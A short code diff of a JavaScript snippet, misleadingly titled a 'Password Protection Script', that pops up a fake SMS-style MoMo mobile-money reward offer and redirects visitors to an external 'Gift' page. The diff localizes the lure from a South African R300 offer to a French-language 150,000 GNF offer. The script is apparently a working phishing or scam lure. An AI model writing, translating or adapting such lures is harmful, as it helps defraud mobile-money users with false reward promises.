@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = 'WITHDRAW R300'
-password=prompt('SMS: Congratulations You are Eligible to receive R300 MoMo Customer Reward Offer, Kindly Press OK to ACTIVATE ','WITHDRAW R300');
-if (password != 'WITHDRAW R300') {
+var password = '150.000GNF'
+password=prompt('SMS : Félicitations, vous êtes éligible pour recevoir une récompense anniversaire MoMo de 150.000GNF, veuillez appuyer sur OK pour ACTIVER ','150.000GNF');
+if (password != '150.000GNF') {
 location.href='http://momo-za.alloffer.org/Gift';
 }
